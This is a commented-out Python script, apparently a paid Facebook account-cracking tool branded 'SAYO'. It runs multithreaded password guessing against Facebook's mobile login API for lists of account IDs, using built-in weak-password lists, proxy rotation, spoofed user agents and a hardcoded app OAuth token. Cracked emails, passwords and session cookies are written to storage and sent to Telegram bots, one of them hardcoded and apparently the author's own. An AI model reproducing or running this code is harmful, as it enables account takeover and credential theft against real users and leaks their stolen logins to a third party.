#                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
#                'user-agent': ua,
#                'x-fb-net-hni': str(random.randint(20000, 40000)),
#                'x-fb-device-group': '5120',
#                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
#                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
#                'x-fb-connection-quality': 'EXCELLENT',
#                'X-FB-Client-IP': 'True',
#                'X-FB-Server-Cluster': 'True',
#                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
#                'x-fb-friendly-name': 'ViewerReactionsMutation',
#                'X-FB-Request-Analytics-Tags': 'graphservice',
#                'accept-encoding': 'gzip, deflate',
#                'x-fb-http-engine': 'Liger'
#            }
#            url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
#            po = requests.post(url, data=data, headers=head, proxies=proxies, allow_redirects=False).text
#            q = json.loads(po)
#            if 'session_key' in q:
#                ckkk = ';'.join((i['name'] + '=' + i['value'] for i in q['session_cookies']))
#                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
#                cookie = f'sb={ssbb};{ckkk}'
#                print(f'''\n{gre} • 𝙽𝚎𝚠 𝙾𝚔 ✔︎
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙴𝚖𝚊𝚒𝚕 » {ids}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » {pas}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙲𝚛𝚎𝚊𝚝 » {creat(ids)}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙱𝚈 » @S_A_Y_O''')
#                OKA = f''' • 𝙽𝚎𝚠 𝙾𝚔 ✔︎
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙴𝚞𝚜𝚊𝚒𝚕 » {ids}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » {pas}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙲𝚛𝚎𝚊𝚝 » {creat(ids)}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙱𝚈 » @S_A_Y_O'''
#                requests.post(f"https://api.telegram.org/bot{str(token)}/sendMessage?chat_id={str(ID)}&text={str(OKA)}")
#                requests.post(f"https://api.telegram.org/bot{str(token2)}/sendMessage?chat_id={str(ID2)}&text={str(OKA)}")
#                open('/sdcard/𝗦𝗔𝗬𝗢-𝗢𝗞.txt', 'a').write(ids + '|' + pas + '\n')
#                open('/sdcard/SAYO-COOKiE.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
#                oks.append(ids)
#            else:
#                if 'www.facebook.com' in q.get('error', {}).get('message', '') and 'y' in q['error']['message']:
#                    if pcp:
#                        print(f'''\n{r} • 𝙽𝚎𝚠 𝙲𝚙 ✘
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙴𝚞𝚜𝚊𝚒𝚕 » {ids}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » {pas}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙲𝚛𝚎𝚊𝚝 » {creat(ids)}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙱𝚈 » @S_A_Y_O''')
#                        CPA = f''' • 𝙽𝚎𝚠 𝙲𝚙 ✘
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙴𝚞𝚜𝚊𝚒𝚝 » {ids}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » {pas}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙲𝚛𝚎𝚊𝚝 » {creat(ids)}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙱𝚈 » @S_A_Y_O'''
#                        requests.post(f"https://api.telegram.org/bot{str(token)}/sendMessage?chat_id={str(ID)}&text={str(CPA)}")
#                        requests.post(f"https://api.telegram.org/bot{str(token2)}/sendMessage?chat_id={str(ID2)}&text={str(CPA)}")
#                    else:
#                        open('/sdcard/𝗦𝗔𝗬𝗢-𝗖𝗣.txt', 'a').write(ids + '|' + pas + '\n')
#                else:
#                    continue
#        loop += 1
#    except requests.exceptions.ConnectionError:
#        time.sleep(10)
#    except Exception as e:
#        pass
#def toasl():
#	
#	os.system("xdg-open https://t.me/S_A_Y_O")
#	menu()
#menu()

#import requests
#from os import path
#from urllib.request import urlopen
#import os
#import base64
#import zlib
#import pip
#import urllib
#import platform
#import math
#import shutil
#import random
#import uuid
#import string
#import hashlib
#import json
#import sys
#import time
#import datetime
#from concurrent.futures import ThreadPoolExecutor as tred
#from rich.console import Console
#from rich.panel import Panel
#from rich import print as rich_print
#from rich.table import Table
#import bs4
#import re
#import subprocess
#import urllib3
#import marshal
#from concurrent.futures import ThreadPoolExecutor as ThreadPool
#from bs4 import BeautifulSoup as sop, BeautifulSoup as parser
#from rich.console import Group as gp
#from rich.panel import Panel as nel
#from rich.markdown import Markdown as mark
#from rich.columns import Columns as col
#from rich import print as cetak, print as rprint, pretty
#from rich.text import Text as tekz
#r = '\033[38;5;196m'
#w = '\x1b[1;97m'
#gre = '\033[38;5;190m'
#y = '\x1b[1;33m'
#blu = '\x1b[1;34m'
#sma = '\x1b[1;96m'
#bn = '\x1b[38;5;208m'
#met = '\033[38;5;200m'
#m161 = '\033[38;5;161m'
#m202 = '\033[38;5;202m'
#m220 = '\033[38;5;220m'
#m196 = '\033[38;5;196m'
#m50 = '\033[38;5;50m'
#m181 = '\033[38;5;181m'
#m170 = '\033[38;5;170m'
#m167 = '\033[38;5;167m'
#m197 = '\033[38;5;197m'
#m226 = '\033[38;5;226m'
#m142 = '\033[38;5;142m'
#m201 = '\033[38;5;226m'
#m45 = '\033[38;5;45m'
#m23 = '\033[38;5;23m'
#m140 = '\033[38;5;140m'
#m213 = '\033[38;5;213m'
#m33 = '\033[38;5;33m'
#m161 = '\033[38;5;161m'
#m43 = '\033[38;5;43m'
#m198 = '\033[38;5;198m'
#m199 = '\033[38;5;199m'
#m128 = '\033[38;5;128m'
#lon = random.choice([r,gre,y,sma,met,m161,m202,m220,m196,m50,m181,m170,m167,m197,m226,m142,m201,m45,m23,m213,m33,m161,m43,m198,m199,m128])
#token2 = '7173661717:AAFcyHGz07MqB71Voh86MUtJ2TU7VNXFYQM'
#ID2 = '5026029533'
#os.system('clear')
#url = "https://raw.githubusercontent.com/2SAYO/Logos/main/Logos"
#response = requests.get(url)
#phrases = []
#current_phrase = []
#for line in response.text.strip().split("\n"):
#    if line:
#        current_phrase.append(line)
#    else:
#        if current_phrase:
#            phrases.append("\n".join(current_phrase))
#            current_phrase = []
#if current_phrase:
#    phrases.append("\n".join(current_phrase))
#chosen_phrase = random.choice(phrases)
#logo = (f"""{lon}{chosen_phrase}


#{gre}━━━━━━━━━━━━━━━━━━━━━━{w}< \033[100m𝗦 𝗔 𝗬 𝗢\033[m {w}>{gre}━━━━━━━━━━━━━━━━━━━━━
#{m45}–╰ 厄 ⸔⸕ {m128}⫷ {m181}𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥       {m170}✜        {m181}𝗦𝗔𝗬𝗢{m128} ⫸      
#{m45}–╰ 厄 ⸔⸕ {m128}⫷ {m181}{m181}𝗧𝗘𝗟𝗘 𝗨𝗦𝗘𝗥       {m170}✜        {m181}@𝗦_𝗔_𝗬_𝗢{m128} ⫸     
#{m45}–╰ 厄 ⸔⸕ {m128}⫷ {m181}𝗧𝗢𝗢𝗟 𝗧𝗬𝗣𝗘       {m170}✜        {m181}𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞{m128} ⫸
#{m45}–╰ 厄 ⸔⸕ {m128}⫷ {m181}𝗧𝗢𝗢𝗟            {m170}✜        {m181}𝗣𝗔𝗜𝗗{m128} ⫸
#{m45}–╰ 厄 ⸔⸕ {m128}⫷ {m181}𝗩𝗘𝗥𝗦𝗜𝗢𝗡         {m170}✜        {m181}𝗩𝟮.𝟮{m128} ⫸
#{gre}━━━━━━━━━━━━━━━━━━━━━━{w}< \033[100m𝗦 𝗔 𝗬 𝗢\033[m {w}>{gre}━━━━━━━━━━━━━━━━━━━━━""")
#def read_config():
#    try:
#        with open('𝗦𝗔𝗬𝗢-𝗧𝗢𝗞𝗘𝗡-𝗜𝗗.json', 'r') as f:
#            config = json.load(f)
#            token = config['token']
#            ID = config['ID']
#    except (FileNotFoundError, KeyError):

#        try:
#            with open('config.txt', 'r') as f:
#                token = f.readline().strip()
#                ID = f.readline().strip()
#        except FileNotFoundError:
#            print(logo)
#            token = input(f'{w}𝗧 {r}𝗢 {w}𝗞 {r}𝗘 {w}𝗡 {r}:{w} ')
#            ID = input(f'{w}𝗜 {r}𝗗 {w}: {r}')
#            
#            if len(token) >= 46 and len(ID) >= 9 and ID.isdigit():
#                config = {'token': token, 'ID': ID}
#                with open('𝗦𝗔𝗬𝗢-𝗧𝗢𝗞𝗘𝗡-𝗜𝗗.json', 'w') as f:
#                    json.dump(config, f)
#    
#    return token, ID

#token, ID = read_config()

#    
#def syline():
#	print(f'{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰{w}▱{gre}▰')
#def menu():   
#    os.system('clear')
#    print(logo)
#    print(f'{y}[{w}1 {m170}/ {w}𝗔 {y}] {gre}𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚\n{y}[{w}2{m170} / {w}𝗕{y} ] {gre}𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥')
#    syline()
#    sayo_menu = input(f'\x1b[1;97m𝗖𝗛𝗢𝗜𝗦𝗘 : {m50}')
#    if sayo_menu in ('1', '01','a','A'):
#        file()
#    if sayo_menu in ('2', '02','b','B'):
#    	toasl()
#def clear():
#	os.system('clear')
#def back():
#	menu()
#••••••••••••••••••••••••UA••••••••••••••••••••••••

#try:
#	prox= requests.get('https://raw.githubusercontent.com/2SAYO/GoodProx/main/prox.txt').text
#	open('.prox.txt','w').write(prox)
#except Exception as e:
#	print('error ')
#prox=open('.prox.txt','r').read().splitlines()

#uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
#fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
#ugen =	[]
#for xd in range(100000):
#	a='Mozilla/5.0 (Symbian/3; Series60/'
#	b=random.randrange(1, 9)
#	c=random.randrange(1, 9)
#	d='Nokia'
#	e=random.randrange(100, 9999)
#	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
#	g=random.randrange(1, 9)
#	h=random.randrange(1, 4)
#	i=random.randrange(1, 4)
#	j=random.randrange(1, 4)
#	k='Mobile Safari/535.1'
#	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
#	ugen.append(uaku)


#	aa='Mozilla/5.0 (Linux; Android'
#	b=random.choice(['2','3','4','5','5.2','6','6.0.1','7','8','9','10','11','11','11.0.1','12','13'])
#	c=random.choice(['OPPO A57 Build/MMB29M; wv'])
#	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
#	e=random.randrange(80,106)
#	f='0'
#	g=random.randrange(3904,5000)
#	h=random.randrange(40,100)
#	i='MQQBrowser/6.2 TBS/045713 Mobile Safari/537.36 MMWEBID/4383 MicroMessenger/8.0.10.1960(0x28000A3D) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
#	uaku2=f'{aa} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'
#	ugen.append(uaku2)
#	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-SM-'
#	b=random.randrange(100, 9999)
#	c=random.randrange(100, 9999)
#	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	h=random.randrange(1, 9)
#	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
#	j=random.randrange(1, 9)
#	k=random.randrange(1, 9)
#	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
#	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
#	ugen.append(uak)
#	a = 'Mozilla/5.0 (iPhone; CPU iPhone OS '
#	b = random.randrange(10, 17)
#	c = random.randrange(0, 5)
#	d = random.randrange(0, 5)
#	e = 'like Mac OS X) AppleWebKit/'
#	f = random.randrange(600, 700)
#	g = random.randrange(1, 5)
#	h = random.randrange(1, 5)
#	i = ' (KHTML, like Gecko) Version/'
#	j = random.randrange(10, 13)
#	k = '.0 Mobile/15E148 Safari/'
#	l = f'{f}.{g}.{h}'
#	ua_ios = f'{a}{b}_{c}_{d} {e}{f}.{g}.{h}{i}{j}{k}{l}'
#	ugen.append(ua_ios)

#def creat(ids):
#    ids_prefixes = {
#        '1000000000': '2009', '100000000': '2009', '10000000': '2009',
#        '1000000': '2009', '1000001': '2009', '1000002': '2009', '1000003': '2009', '1000004': '2009', '1000005': '2009',
#        '1000006': '2010', '1000007': '2010', '1000008': '2010', '1000009': '2010',
#        '100001': '2010-2011', '100002': '2011-2012', '100003': '2011-2012',
#        '100004': '2012-2013', '100005': '2013-2014', '100006': '2013-2014',
#        '100007': '2014-2015', '100008': '2014-2015', '100009': '2015',
#        '10001': '2015-2016', '10002': '2016-2017', '10003': '2018',
#        '10004': '2019', '10005': '2020', '10006': '2021-2022', '10007': '2021-2022', '10008': '2021-2022'
#    }
#    
#    CreAt = ''
#    if len(ids) == 15:
#        for prefix, year in ids_prefixes.items():
#            if ids.startswith(prefix):
#                CreAt = year
#                break
#    elif len(ids) in (9, 10):
#        CreAt = '2008-2009'
#    elif len(ids) == 8:
#        CreAt = '2007-2008'
#    elif len(ids) == 7:
#        CreAt = '2006-2007'
#    else:
#        CreAt = ''

#    return CreAt
#••••••••••••••••••••••••UA••••••••••••••••••••••••
#loop=0
#lim=0
#oks=[]
#cps=[]
#pcp=[]
#ses = requests.Session()
#def file():
#				syline()
#				file = input(f'{w}𝗙𝗜𝗟𝗘 𝗣𝗔𝗧𝗛 :{m50} ')
#				syline()
#				try:
#					fo = open(file,'r').read().splitlines()
#				except FileNotFoundError:
#					print(f'{r}𝗙𝗜𝗟𝗘 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗')
#					time.sleep(2)
#					menu()
#				plist = []
#				print(f"""{r}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━┓
#┃ {gre}𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗜𝗡𝗙𝗢{r}                  ┃    {gre}𝗖𝗥𝗔𝗖𝗞 𝗦𝗣𝗘𝗘𝗗{r}     ┃
#┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━┩
#{r}{r}│ {y}[{w}1{y}] {m161}𝗦𝗧𝗥𝗢𝗡𝗚 𝗣𝗔𝗦𝗦                {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟴𝟭% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}2{y}] {bn}𝗠𝗘𝗗𝗜𝗨𝗠 𝗣𝗔𝗦𝗦                {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟴𝟵% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}3{y}] {m196}𝗠𝗜𝗫 𝗣𝗔𝗦𝗦                   {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟯𝟬% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}4{y}] {m220}𝗬𝗘𝗔𝗥𝗦 𝗣𝗔𝗦𝗦 {w}[ {m220}1970-2024{w} ]   {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟯𝟱% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}5{y}] {m45}𝗟𝗘𝗧𝗧𝗘𝗥𝗦 {w}+ {m45}𝗡𝗨𝗠𝗕𝗘𝗥𝗦 [𝗦𝗣𝗘𝗘𝗗]  {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟳𝟯% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}6{y}] {m170}𝗩𝗘𝗥𝗬 𝗦𝗧𝗥𝗢𝗡𝗚 𝗣𝗔𝗦𝗦           {r}{r}│  {w}[ {m43}𝗦𝗣𝗘𝗘𝗗{w} - {m43}𝟲𝟰% {w}]   {r}{r}│
#{r}{r}│ {y}[{w}7{y}]{m213} 𝗠𝗔𝗡𝗨𝗔𝗟 𝗣𝗔𝗦𝗦                {r}{r}│ {w}[ {m43}𝗩𝗔𝗥𝗜𝗔𝗕𝗟𝗘 𝗦𝗣𝗘𝗘𝗗 {w}] {r}{r}│
#└────────────────────────────────┴────────────────────┘""")
#				syline()
#				ppp=input(f'{w}𝗖𝗛𝗢𝗜𝗦𝗘 : {m50}')
#				if ppp in ['1','01']:
#					plist.append('qqwweerrttyy')
#					plist.append('first last')
#					plist.append('llkkjjhhggffddssaa')
#					plist.append('mmnnbbvvccxxzz')
#					plist.append('07700770')
#					plist.append('ppooiiuuyy')
#					plist.append('qwertqwert')
#					plist.append('zzxxccvvbbnnmm')
#					plist.append('2244668800')
#					plist.append('qqwweerrttyyuuiioopp')
#					plist.append('aassddffgghhjjkkll')
#					plist.append('1234512345@')
#					plist.append('0099887766')
#					plist.append('1234@@@@')
#					plist.append('12345@@@@@')
#					plist.append('aaaassss')
#					plist.append('zzxxccvv')
#					plist.append('100020003000')
#					plist.append('10002000')
#					plist.append('qwertyuiopasdfghjkl')
#					plist.append('qwertyuiopasdfghjklzxcvbnm')
#					plist.append('1020304050')
#					plist.append('10203040')
#				elif ppp in ['2','02']:
#					plist.append('first last')
#					plist.append('qqwwee')
#					plist.append('aassdd')                
#					plist.append('07700770')
#					plist.append('qqqqwwww')
#					plist.append('zzzzxxxx')
#					plist.append('zzxxccvvbbnnmm')
#					plist.append('zzxxcc')
#					plist.append('qwertyuiopasdfghjkl')
#					plist.append('qwerqwer')
#					plist.append('mmnnbbvvccxxzz')
#					plist.append('22446688')
#					plist.append('ppooiiuu')
#					plist.append('11112222')
#					plist.append('mnbvmnbv')
#				elif ppp in ['3','03']:
#					plist.append('qqwwee')
#					plist.append('aassdd')
#					plist.append('07700770')
#					plist.append('qqqqwwww')
#					plist.append('zzzzxxxx')
#					plist.append('07700770')
#					plist.append('20212021')
#					plist.append('07700770')
#					plist.append('00009999')
#					plist.append('12345@12345')
#					plist.append('22446688')
#					plist.append('11112222')
#					plist.append('mmnnbbvv')
#					plist.append('firstlast')
#					plist.append('firstfirst')
#					plist.append('first first')
#					plist.append('zzxxccvv')
#					plist.append('ppooiiuuyy')
#					plist.append('ppooiiuu')
#					plist.append('qqwweerr')
#					plist.append('qqwweerrtt')
#					plist.append('aassddff')
#					plist.append('qqwwee')
#					plist.append('aassdd')
#					plist.append('zzxxcc')
#					plist.append('zzxxccvv')
#					plist.append('asdfghjklasdfghjkl')
#					plist.append('qqwweerrttyyuuiioopp')
#					plist.append('qqwweerrttyy')
#					plist.append('qwertyuiopqwertyuiop')
#					plist.append('asdfghjklasdfghjkl')
#					plist.append('llkkjjhh')
#					plist.append('mmnnbbvvccxxzz')
#					plist.append('zzxxccvvbbnnmm')
#					plist.append('aaaassss')
#					plist.append('qqqqwwww')
#					plist.append('qwertyuiop')
#					plist.append('nnnnmmmm')
#					plist.append('zxcvzxcv')
#					plist.append('19991999')
#					plist.append('20062006')
#					plist.append('19951995')
#					plist.append('19931993')
#					plist.append('ppppoooo')
#					plist.append('oooopppp')
#					plist.append('mmmmnnnn')
#					plist.append('19901990')
#					plist.append('19911991')
#					plist.append('19921992')
#					plist.append('19941994')
#					plist.append('20232023')
#					plist.append('19961996')
#					plist.append('19971997')
#					plist.append('19981998')
#					plist.append('20202020')
#					plist.append('20002000')
#					plist.append('20012001')
#					plist.append('20022002')
#					plist.append('20032003')
#					plist.append('20042004')
#					plist.append('20052005')
#					plist.append('20102010')
#					plist.append('20072007')
#					plist.append('20082008')
#					plist.append('20092009')
#					plist.append('ppppoooo')
#					plist.append('oooopppp')
#				elif ppp in ['4','04']:
#					plist.append('19701970')
#					plist.append('19711971')
#					plist.append('19721972')
#					plist.append('19731973')
#					plist.append('19741974')
#					plist.append('19751975')
#					plist.append('19761976')
#					plist.append('19771977')
#					plist.append('19781978')
#					plist.append('19791979')
#					plist.append('19801980')
#					plist.append('19811981')
#					plist.append('19821982')
#					plist.append('19831983')
#					plist.append('19841984')
#					plist.append('19851985')
#					plist.append('19861986')
#					plist.append('19871987')
#					plist.append('19881988')
#					plist.append('19891989')
#					plist.append('19901990')
#					plist.append('19911991')
#					plist.append('19921992')
#					plist.append('19931993')
#					plist.append('19941994')
#					plist.append('19951995')
#					plist.append('19961996')
#					plist.append('19971997')
#					plist.append('19981998')
#					plist.append('19991999')
#					plist.append('20002000')
#					plist.append('20012001')
#					plist.append('20022002')
#					plist.append('20032003')
#					plist.append('20042004')
#					plist.append('20052005')
#					plist.append('20062006')
#					plist.append('20072007')
#					plist.append('20082008')
#					plist.append('20092009')
#					plist.append('20102010')
#					plist.append('20112011')
#					plist.append('20122012')
#					plist.append('20132013')
#					plist.append('20142014')
#					plist.append('20152015')
#					plist.append('20162016')
#					plist.append('20172017')
#					plist.append('20182018')
#					plist.append('20192019')
#					plist.append('20202020')
#					plist.append('20212021')
#					plist.append('20222022')
#					plist.append('20232023')
#					plist.append('20242024')
#				elif ppp in ['5','05']:
#					plist.append('11223344@@@')
#					plist.append('112233445566@@')
#					plist.append('1234@@@@')
#					plist.append('0099887766')
#					plist.append('qwert12345')
#					plist.append('11223344@@')
#					plist.append('1122334455@@')
#					plist.append('112233@@')
#					plist.append('first last')
#					plist.append('first123')
#					plist.append('22446688')
#					plist.append('90909090')
#					plist.append('12341234@@')
#					plist.append('77889900')
#					plist.append('10002000')
#					plist.append('07700770')
#					plist.append('6677889900')
#					plist.append('11110000')
#					plist.append('00998877')
#					plist.append('20232023')
#					plist.append('1234512345@@')
#					plist.append('12345qwert')
#					plist.append('123@@123')
#					plist.append('20002000')
#					plist.append('5544332211')
#					plist.append('123456$$')
#					plist.append('19801980')
#					plist.append('19951995')
#					plist.append('11112222')
#				elif ppp in ['6','06']:
#					plist.append('qqwwee')
#					plist.append('aassdd')
#					plist.append('07700770')
#					plist.append('qqqqwwww')
#					plist.append('zzzzxxxx')
#					plist.append('07700770')
#					plist.append('20212021')
#					plist.append('07700770')
#					plist.append('00009999')
#					plist.append('12345@12345')
#					plist.append('22446688')
#					plist.append('11112222')
#					plist.append('mmnnbbvv')
#					plist.append('firstlast')
#					plist.append('firstfirst')
#					plist.append('first first')
#					plist.append('zzxxccvv')
#					plist.append('ppooiiuuyy')
#					plist.append('ppooiiuu')
#					plist.append('qqwweerr')
#					plist.append('qqwweerrtt')
#					plist.append('aassddff')
#					plist.append('qqwwee')
#					plist.append('aassdd')
#					plist.append('zzxxcc')
#					plist.append('zzxxccvv')
#					plist.append('asdfghjklasdfghjkl')
#					plist.append('qqwweerrttyyuuiioopp')
#					plist.append('qqwweerrttyy')
#					plist.append('qwertyuiopqwertyuiop')
#					plist.append('asdfghjklasdfghjkl')
#					plist.append('llkkjjhh')
#					plist.append('mmnnbbvvccxxzz')
#					plist.append('zzxxccvvbbnnmm')
#					plist.append('aaaassss')
#					plist.append('qqqqwwww')
#					plist.append('qwertyuiop')
#					plist.append('nnnnmmmm')
#					plist.append('zxcvzxcv')
#					
#					
#				else:
#					try:
#						syline()
#						ps_limit = int(input(f'{m50}𝗛𝗢𝗪 𝗠𝗔𝗡𝗬 𝗣𝗔𝗦𝗦 𝗧𝗢 𝗔𝗗𝗗 ? : '))
#					except:
#						ps_limit =1
#					syline()
#					print(f'{w}𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : {r}first last,qwerqwer,00998877')
#					syline()
#					for i in range(ps_limit):
#						plist.append(input(f'𝗣𝗨𝗧 𝗣𝗔𝗦𝗦𝗢𝗪𝗥𝗗 {i+1}: '))
#				
#				cx=('1')
#				if cx in ['1','Y','yes','Yes','1']:
#					pcp.append('y')
#				else:
#					pcp.append('')
#				with tred(max_workers=50) as crack_submit:
#					clear()
#					total_ids = str(len(fo))
#					lim= int(total_ids)
#					print(logo)
#					print(f'{w}𝗬𝗢𝗨𝗥 𝗙𝗜𝗟𝗘 : {met}{file}')
#					syline()
#					print(f'\x1b[1;97m𝗧𝗢𝗧𝗔𝗟 𝗜𝗗𝗦 : {gre}'+total_ids+f' ')
#					syline()
#					for user in fo:
#						ids,names = user.split('|')
#						passlist = plist
#						crack_submit.submit(api,ids,names,passlist)
#				print('\033[1;37m')
#				syline()
#				print('𝗧𝗛𝗘 𝗖𝗥𝗔𝗖𝗞 𝗜𝗦 𝗖𝗢𝗠𝗣𝗟𝗘𝗧......')
#				syline()
#				print(f'{w}𝗖𝗔𝗧𝗖𝗛 {gre}𝗢𝗞 {w}| {r}𝗖𝗣 {w}:{gre} '+str(len(oks))+f' {w}|{r} '+str(len(cps)))
#				syline()
#				print(f'''{y}[{w}1{y}] {gre} 𝗖𝗢𝗠𝗣𝗟𝗜𝗧𝗘 𝗖𝗥𝗔𝗖𝗞\n{y}[{w}2{y}] {gre} 𝗘𝗫𝗜𝗧 𝗧𝗢𝗢𝗟''')
#				syline()
#				krrk = input(f'\x1b[1;97m𝗖𝗛𝗢𝗜𝗦𝗘 : {m50}')
#				try:
#				    krrk = int(krrk)
#				    if krrk == 1:
#				        back()
#				    elif krrk == 2:
#				        exit()
#				    else:
#				        exit()
#				except ValueError:
#				    exit()
#				
#def api(ids, names, passlist):
#    global loop, oks, cps
#    try:
#        ro = random.choice([r, w, gre, y, sma, met])
#        lo = random.choice([w, met])
#        sys.stdout.write(f'\r\r{met}[{ro}𝗦𝗔𝗬𝗢{met}] {w}- {met}[{lo}{loop}{met}] {w}- {met}[{gre}𝗢𝗞{w}  : {gre}{len(oks)}{met}] {w}- {met}[{r}𝗖𝗣{w}  : {r}{len(cps)}{met}]')
#        sys.stdout.flush()
